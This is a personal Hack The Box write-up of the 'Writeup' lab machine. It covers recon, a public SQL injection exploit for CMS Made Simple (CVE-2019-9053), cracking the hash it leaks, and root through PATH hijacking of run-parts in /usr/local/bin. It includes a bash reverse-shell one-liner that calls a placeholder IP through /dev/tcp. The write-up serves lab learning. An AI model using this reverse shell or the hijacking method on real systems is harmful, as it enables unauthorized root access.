Title: htb - writeup
Tags: #htb #lab #writeup #linux #CVE-2019-9053 #path-hijacking

---
### Walkthrough 

#### tldr;
web server is using CMS made simple which is vulnerable to blind sqli (CVE-2019-9053), leading to credential leak with MD5 hash which can be used for ssh after cracking it

for the privilege escalation, it is coming from path hijacking as the user is added to the system `staff` group that has write access to `/usr/local/bin` 


IP: 10.10.10.138
#### Reconnaissance 

Starting with a nmap scan on the provided IP  
```bash
nmap -sC -sV -A 10.10.10.138 -p- -oA nmap/nmap_scan
```

The nmap scan show that there are 2 ports open:
- 22 - OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
- 80 - Apache httpd 2.4.25 ((Debian))

From the scan, is show that the webpage hosted on port 80 has the path `/writeup` from `robots.txt`. Browsing through the site, on the root path (http://10.10.10.138/), you will be greeted with a message stating that there is a DoS protection that is looking for 40X errors on the webpage. This mean that directory bruteforcing would not be a good idea  - learned this the hard way,running ffuf on it blocks my IP :)

Upon browsing the website once the IP ban is over, there was nothing much within it as it is just a webpage that shows the user ctf writeups and there are no user controllable source.

But by looking at the source code for http://10.10.10.138/writeup, it turns out the website is hosted on a CMS known as CSM Made Simple has the copyright years with it. After some searching, it looks like there are only 5 release in 2019.![](assets/Pasted%20image%2020250809174622.png)

#### CVE-2019-9053
And after some searching, there is one vulnerability SQL injection CVE that aligns with the year - CVE-2019-9053 - along with the exploit script - [ref](https://www.exploit-db.com/exploits/46635). 

After setting up the script and running it, it was able to get the username, email, MD5 password hash and its hash value, which can be cracked via `hashcat`![](assets/Pasted%20image%2020250809174632.png)
#### User Flag
Using newly obtained credential, we will be able to ssh into the server and obtain the user flag.![](assets/Pasted%20image%2020250809174653.png)    
#### Privilege Escalation 
To get to root in this box took awhile, as after enumerating for quite sometime such as checking for sudo access, cronjobs, misconfigured SUID and so on... 

But after awhile, I realized that I completely forgotten to check the user group that this user is assigned to. Upon checking it, one group that stands out the most if the `staff` group as it does not look default system group.![](assets/Pasted%20image%2020250809174704.png)![](assets/Pasted%20image%2020250809174710.png)

Which turns out it actually is, as the group ID is less then 1000 which by convention it should be a system group. So I decided to dig further, and found the this group is a default group for Debian. From the Debian wiki, it states that the staff group allow users to modify `/usr/local` including `/usr/local/bin` without root privilege.![](assets/Pasted%20image%2020250809174720.png)  
![](assets/Pasted%20image%2020250809174725.png)    

With this new information, I start trying a few things such as creating a simple bash script that echos out `whoami` in `/usr/local/bin`, but ultimately the user the output was always `jkr` instead of `root`, which makes sense since `jkr` user is the one that is executing the script. 

So back to more researching, I stumble upon an attack know as Path Hijacking (might have taken a peak in the walkthrough). 
##### Path Hijacking
So path hijacking is just as its name suggested, we will be hijacking a legitimate binary by creating a malicious binary with the same name, whereby the system will be invoking the malicious binary instead of the legitimate binary. This can be done by taking advantage of the order of execution for the `PATH` env variable  

So, from my understanding, path hijacking requires three condition to be met: 
1. A privilege user to run the malicious binary 
2. The binary execution need to be from a relative path as oppose to absolute path 
3. The vulnerable `PATH` needs to come first in the $PATH env variable (which in this case its `/usr/local/bin`)
	1. `/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games`
	2. ![](assets/Pasted%20image%2020250809174732.png)

In our case, from the 3 mentioned conditions only one have been met so far, which is `/usr/local/bin` come first within the `PATH` env. This means that we will be overwrite any legitimate binary  with our own malicious binary 

Here's a simple POC for that, overwritten `md5sum` and replaced it with a bash script. ![](assets/Pasted%20image%2020250809174744.png)   

One thing that I encounter in this, to speed/optimized binary execution, bash actually creates hash table to for the binaries. What this means is that eventhough `which` is pointing to the malicious binary, the hash table will still take precedence. To check this the `type` command can be use and the `hash -r` command can be use to clear the hash table. 

Back to the main goal, we are still missing 2 conditions, a privilege user running the binary and a binary that is getting executed, to locate we can use a tool know as `pspy` to snoop the processes that is being executed without having root access. 

While the `pspy` is running, a binary called `run-parts` is getting executed by `root` (as indicated by the uid of 0) with relative path whenever a new ssh session is established.![](assets/Pasted%20image%2020250809174807.png)
##### Root Flag
With this all three conditions are met, we just need to create a malicious `run-parts` binary under `/usr/local/bin` and start a new ssh session to invoke the binary. (In this case the `hash -r` is not needed, which from my assumption is that since this is a new session, the hash table is not populated yet)

Reverse shell script 
```
#!/bin/bash
/bin/bash -i >& /dev/tcp/<replace with ip>/4444 0>&1
```

Reverse shell listener ![](assets/Pasted%20image%2020250809174817.png)  
### References
- https://wiki.debian.org/SystemGroups
- https://github.com/DominicBreuker/pspy
- https://nvd.nist.gov/vuln/detail/CVE-2019-9053
- https://www.exploit-db.com/exploits/46635
- https://github.com/vulhub/vulhub/blob/master/cmsms/CVE-2019-9053/README.md
- https://github.com/ELIZEUOPAIN/CVE-2019-9053-CMS-Made-Simple-2.2.10---SQL-Injection-Exploit
